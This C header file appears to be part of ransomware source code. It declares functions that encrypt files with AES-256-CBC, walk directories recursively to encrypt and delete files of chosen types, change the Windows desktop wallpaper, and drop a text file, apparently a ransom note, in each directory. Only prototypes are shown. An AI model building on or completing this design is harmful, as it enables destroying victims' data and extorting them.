#pragma once

#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#else
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#endif

// Encrypts a file using AES-256-CBC
void encryptFile(const char* inputFile, const char* outputFile, const unsigned char* key, const unsigned char* iv);

// Encrypts files in a directory and its subdirectories
void encryptAndDeleteFilesRecursively(const char* directory, const unsigned char* key, const char* fileTypes[], int numFileTypes);

#ifdef _WIN32
// Changes the wallpaper of the desktop on Windows
void changeWallpaper(const char* wallpaperPath);
#endif

// Leaves a text file in directories
void leaveTextFileInDirectories(const char* directory, const char* textFileName);


